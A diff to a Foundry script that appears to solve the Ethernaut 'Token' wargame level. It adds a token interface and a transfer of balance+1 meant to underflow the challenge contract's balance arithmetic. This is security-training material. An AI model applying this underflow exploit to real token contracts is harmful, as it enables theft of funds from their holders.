@@ -5,6 +5,10 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+interface IToken {
+    function transfer(address _to, uint _value) external;
+    function balanceOf(address _owner) external returns(uint256);
+}
 
 contract TokenSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x478f3476358Eb166Cb7adE4666d04fbdDB56C407;
@@ -15,8 +19,9 @@ contract TokenSolution is Script, EthernautHelper {
         // NOTE this is the address of your challenge contract
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
-        // YOUR SOLUTION HERE
-
+        address owner = 0xd4c384eC8a9f9EbFc97458833FF0147a131f7057;
+        uint256 balance = IToken(challengeInstance).balanceOf(owner);
+        IToken(challengeInstance).transfer(challengeInstance, balance+1);
 
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
